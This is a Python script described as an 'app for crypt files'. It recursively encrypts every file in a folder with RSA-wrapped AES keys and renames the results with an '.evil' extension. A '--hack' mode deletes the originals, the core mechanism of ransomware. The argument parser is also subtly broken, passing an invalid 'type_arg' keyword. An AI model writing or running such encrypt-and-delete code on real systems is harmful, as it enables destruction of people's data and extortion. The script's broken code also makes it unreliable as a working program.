import argparse
import os

from os.path import basename
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

MASK = "evil"
PUBLIC_KEY = "public_key.pem"
PATH = "path"
FILE = "file"

def open_file(path_file, hack_mode, mask):
    try:
        file_to_crypt = open(path_file, "rb")
    except:
        print("Can not open file: ", path_file)
    else:
        data = file_to_crypt.read()
        file_to_crypt.close()
        if hack_mode == 1:
            os.remove(path_file)

        crypto_file(path_file, data, mask)

def crypto_file(path_file, data, mask):
    _mask = MASK
    if mask:
        _mask = mask

    print('Source file: ', path_file, "--> ", path_file + "."+ _mask)
    with open(path_file + "." + _mask, 'wb') as out_file:
        recipient_key = RSA.import_key(open(PUBLIC_KEY).read())
            
        session_key = get_random_bytes(16)
        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        out_file.write(cipher_rsa.encrypt(session_key))
        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)

        out_file.write(cipher_aes.nonce)
        out_file.write(tag)
        out_file.write(ciphertext)
        out_file.close()

def list_files_path(path_folder):
    list_files = []
    for top, dirs, files in os.walk(path_folder):
        for nm in files:       
            list_files.append(os.path.join(top, nm))

    return list_files

def type_search_files(type_arg, path_files, hack_mode, mask):
    if type_arg == PATH:
        list_files = list_files_path(path_files)
        if not list_files:
            print("File or directory is empty or not exists.")
            return

        for file in list_files:
            open_file(file, hack_mode, mask)

    if type_arg == FILE:
        open_file(path_files, hack_mode, mask)

def args_parser(args):
    if args.hack:
        hack_mode = 1
    else:
        hack_mode = 0

    if not args.p and not args.f:
        print("Args is empty, try --help.")

    if args.p:
        type_search_files(PATH, args.p, hack_mode, args.m)

    if args.f:
        type_search_files(FILE, args.f, hack_mode, args.m)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='This is app for crypt files.')
    parser.add_argument('-p', type_arg=str, help='Path to folder with files.')
    parser.add_argument('-f', type_arg=str, help='Path to file.')
    parser.add_argument('-m', type_arg=str, help='Mask for encryption file.')
    parser.add_argument('--hack', action='store_true', help='Activate Hack mode :DDD (Source files will be deleted!)')
    args_parser(parser.parse_args())